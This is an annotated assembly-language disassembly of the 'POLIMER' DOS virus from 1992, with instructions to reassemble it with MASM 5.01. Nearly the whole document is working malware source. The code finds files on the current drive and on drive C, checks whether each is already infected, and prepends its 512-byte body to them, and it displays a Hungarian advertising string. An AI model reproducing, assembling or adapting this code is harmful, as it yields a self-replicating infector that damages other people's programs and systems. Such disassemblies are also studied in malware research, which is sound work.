  
PAGE  59,132
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл                        POLIMER VIRUS                                 лл
;лл                                                                      лл
;лл      Disassembly by >> Wasp << a.k.a. Night Crawler.                 лл
;лл								         лл
;лл      Created:   5-Jan-92					         лл
;лл      Version:   1.0d                                                 лл
;лл      Passes:    5	       Analysis Options on: OW		         лл
;лл								         лл
;лл      Reassemble with MASM 5.01                                       лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
movseg		 macro reg16, unused, Imm16     ; Fixup for Assembler
		 ifidn	<reg16>, <bx>
		 db	0BBh
		 endif
		 ifidn	<reg16>, <cx>
		 db	0B9h
		 endif
		 ifidn	<reg16>, <dx>
		 db	0BAh
		 endif
		 ifidn	<reg16>, <si>
		 db	0BEh
		 endif
		 ifidn	<reg16>, <di>
		 db	0BFh
		 endif
		 ifidn	<reg16>, <bp>
		 db	0BDh
		 endif
		 ifidn	<reg16>, <sp>
		 db	0BCh
		 endif
		 ifidn	<reg16>, <BX>
		 db	0BBH
		 endif
		 ifidn	<reg16>, <CX>
		 db	0B9H
		 endif
		 ifidn	<reg16>, <DX>
		 db	0BAH
		 endif
		 ifidn	<reg16>, <SI>
		 db	0BEH
		 endif
		 ifidn	<reg16>, <DI>
		 db	0BFH
		 endif
		 ifidn	<reg16>, <BP>
		 db	0BDH
		 endif
		 ifidn	<reg16>, <SP>
		 db	0BCH
		 endif
		 dw	seg Imm16
endm
DATA_1E		EQU	80H
DATA_2E		EQU	162H
DATA_3E		EQU	16AH
DATA_4E		EQU	0C0H
DATA_5E		EQU	103H
DATA_6E		EQU	128H
DATA_7E		EQU	2B9H
DATA_8E		EQU	0C0H
DATA_9E		EQU	0C1H
DATA_10E	EQU	0C8H
DATA_12E	EQU	0CAH
DATA_14E	EQU	0CCH
DATA_23E	EQU	0
DATA_24E	EQU	100H
DATA_25E	EQU	200H
  
SEG_A		SEGMENT	BYTE PUBLIC
		ASSUME	CS:SEG_A, DS:SEG_A
  
  
		ORG	100h
  
POLIMER		PROC	FAR
  
START:
		JMP	LOC_4			; (0183)
		DB	 00H, 3FH
		DB	7 DUP (3FH)
		DB	 43H, 4FH, 4DH, 00H, 1AH, 00H
		DB	 00H, 00H, 2EH,0F2H, 0CH, 2BH
		DB	 01H
		DB	15 DUP (0)
DATA_18		DB	'A le', 27H, 'jobb kazetta a POLI'
		DB	'MER kazetta !   Vegye ezt !    ', 0AH
		DB	0DH, '$'
		DB	'ERROR', 0AH, 0DH, '$'
DATA_19		DW	5
DATA_20		DW	18D8H
LOC_1:
		MOV	SI,DATA_7E
		MOV	DI,DATA_8E
		MOV	CX,30H
		CLD				; Clear direction
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		JMP	$-0BAH
LOC_2:
		JMP	LOC_10			; (0296)
LOC_3:
		JMP	LOC_9			; (028F)
LOC_4:
		MOV	AL,0
		MOV	AH,0EH
		INT	21H			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		MOV	DX,DATA_4E
		MOV	AH,1AH
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		MOV	DX,DATA_6E
		MOV	AH,9
		INT	21H			; DOS Services  ah=function 09h
						;  display char string at ds:dx
LOC_5:
		MOV	DX,DATA_5E
		MOV	AH,11H
		INT	21H			; DOS Services  ah=function 11h
						;  find filename, FCB @ ds:dx
		TEST	AL,AL
		JNZ	LOC_2			; Jump if not zero
LOC_6:
		MOV	WORD PTR DS:DATA_14E,2424H
		MOV	AX,DS:DATA_12E
		MOV	WORD PTR DS:DATA_12E+1,AX
		MOV	AX,DS:DATA_10E
		MOV	AL,2EH			; '.'
		MOV	WORD PTR DS:DATA_10E+1,AX
		MOV	AL,2
		MOV	DX,DATA_9E
		MOV	AH,3DH			; '='
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		JC	LOC_3			; Jump if carry Set
		MOV	DATA_19,AX
		MOV	BX,DATA_19
		MOV	CX,0
		MOV	DX,0
		MOV	AL,2
		MOV	AH,42H			; 'B'
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_3			; Jump if carry Set
		MOV	DATA_20,AX
		MOV	BX,DATA_19
		MOV	CX,0
		MOV	DX,0
		MOV	AL,0
		MOV	AH,42H			; 'B'
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_3			; Jump if carry Set
		MOV	BX,DATA_19
		MOV	CX,200H
		MOV	DX,DATA_23E
		MOV	AX,DS
		ADD	AX,1000H
		MOV	DS,AX
		MOV	AH,3FH			; '?'
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		MOV	CX,80H
		CLD				; Clear direction
		MOV	SI,DATA_24E
		MOV	DI,OFFSET DS:[200H]
		REPE	CMPSB			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		JZ	LOC_8			; Jump if zero
		MOV	BX,CS:DATA_19
		MOV	CX,CS:DATA_20
		SUB	CX,200H
		MOV	DX,DATA_25E
		MOV	AH,3FH			; '?'
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		MOV	AX,DS
		SUB	AX,1000H
		MOV	DS,AX
		MOV	BX,DATA_19
		MOV	CX,0
		MOV	DX,0
		MOV	AL,0
		MOV	AH,42H			; 'B'
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		MOV	BX,DATA_19
		MOV	DX,OFFSET DS:[100H]
		MOV	CX,200H
		MOV	AH,40H			; '@'
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		MOV	BX,DATA_19
		MOV	DX,DATA_23E
		MOV	CX,DATA_20
		MOV	AX,DS
		ADD	AX,1000H
		MOV	DS,AX
		MOV	AH,40H			; '@'
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		MOV	AX,DS
		SUB	AX,1000H
		MOV	DS,AX
		MOV	BX,DATA_19
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		JMP	SHORT LOC_10		; (0296)
		DB	90H
LOC_7:
		MOV	DX,DATA_5E
		MOV	AH,12H
		INT	21H			; DOS Services  ah=function 12h
						;  find next filenam, FCB @ds:dx
		TEST	AL,AL
		JNZ	LOC_10			; Jump if not zero
		JMP	LOC_6			; (01A2)
LOC_8:
		MOV	AX,DS
		SUB	AX,1000H
		MOV	DS,AX
		MOV	BX,DS:DATA_3E
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		JMP	SHORT LOC_7		; (0270)
LOC_9:
		MOV	DX,DATA_2E
		MOV	AH,9
		INT	21H			; DOS Services  ah=function 09h
						;  display char string at ds:dx
LOC_10:
		MOV	AH,19H
		INT	21H			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		TEST	AL,AL
		JNZ	LOC_11			; Jump if not zero
		MOV	DL,2
		MOV	AH,0EH
		INT	21H			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		MOV	AH,19H
		INT	21H			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		TEST	AL,AL
		JZ	LOC_11			; Jump if zero
		JMP	LOC_5			; (0197)
LOC_11:
		MOV	DX,DATA_1E
		MOV	AH,1AH
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		JMP	LOC_1			; (016E)
		DB	0BEH, 00H, 03H
		DB	0BFH, 00H, 01H,0B9H, 00H,0FDH
		DB	0FCH,0F3H,0A4H,0EBH
		DB	 32H, 90H
		DB	56 DUP (0)
  
POLIMER		ENDP
  
SEG_A		ENDS
  
  
  
		END	START
